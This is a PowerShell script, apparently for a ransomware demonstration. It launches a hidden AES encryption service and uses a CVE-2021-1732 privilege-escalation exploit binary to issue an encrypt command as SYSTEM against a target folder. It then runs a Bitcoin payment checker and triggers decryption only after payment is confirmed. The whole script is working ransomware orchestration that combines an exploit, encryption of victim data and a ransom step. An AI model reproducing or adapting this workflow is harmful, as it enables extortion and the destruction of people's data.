<# -------- CONFIG -------- #>
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path

$controlDir = 'C:\EncControl'            # MUST match what AES128C.exe uses
$targetDir  = 'C:\DemoData'              # Directory to encrypt/decrypt

$AESsvc   = Join-Path $scriptDir 'ConsoleApplication2.exe'
$CVEexe   = Join-Path $scriptDir 'CVE-2021-1732.exe'
$ShellBTC = Join-Path $scriptDir 'shellBTC.exe'

<# -------- Ensure directories exist -------- #>
if (-not (Test-Path $controlDir)) {
    New-Item -ItemType Directory -Path $controlDir | Out-Null
}
if (-not (Test-Path $targetDir)) {
    New-Item -ItemType Directory -Path $targetDir | Out-Null
}

<# -------- Validate required executables -------- #>
foreach ($exe in @($AESsvc, $CVEexe, $ShellBTC)) {
    if (-not (Test-Path $exe)) {
        Write-Error "❌ Required file not found: $exe"
        exit 1
    }
}

<# -------- 1) Start AES background service as current user -------- #>
Write-Host "[+] Starting AES128C service as user: $env:USERNAME"
Start-Process -FilePath $AESsvc -WindowStyle Hidden
Start-Sleep 2

<# -------- 2) Use CVE to write ENCRYPT instruction as SYSTEM -------- #>
Write-Host "[+] Triggering encryption instruction via CVE..."
$cmd = 'cmd /c echo ENCRYPT>C:\EncControl\instruction.txt & echo C:\DemoData>C:\EncControl\target_dir.txt'
Start-Process -FilePath $CVEexe -ArgumentList "`"$cmd`"" -Wait
Start-Sleep 2

<# -------- DEBUG check -------- #>
$instructionPath = "$controlDir\instruction.txt"
if (Test-Path $instructionPath) {
    $instr = Get-Content $instructionPath -ErrorAction SilentlyContinue
    Write-Host "[DEBUG] instruction.txt = $instr"
} else {
    Write-Warning "[DEBUG] instruction.txt not found. CVE may have failed."
}

<# -------- 3) Run shellBTC and wait -------- #>
Write-Host "`n*** shellBTC running — watch stdout for the address ***`n"
$btcProc = Start-Process -FilePath $ShellBTC -NoNewWindow -Wait -PassThru

<# -------- 4) If payment received, issue DECRYPT -------- #>
if ($btcProc.ExitCode -eq 1) {
    Write-Host "`n✅ Payment confirmed — decrypting..."

    $cmd = 'cmd /c echo DECRYPT>C:\EncControl\instruction.txt & echo C:\DemoData>C:\EncControl\target_dir.txt'
    Start-Process -FilePath $CVEexe -ArgumentList "`"$cmd`"" -Wait
} else {
    Write-Warning "⚠️ shellBTC exited with code $($btcProc.ExitCode) — no decryption triggered"
}

<# -------- 5) Stop AES service -------- #>
Get-Process AES128C -ErrorAction SilentlyContinue | Stop-Process -Force
Write-Host "`n[+] Workflow complete."
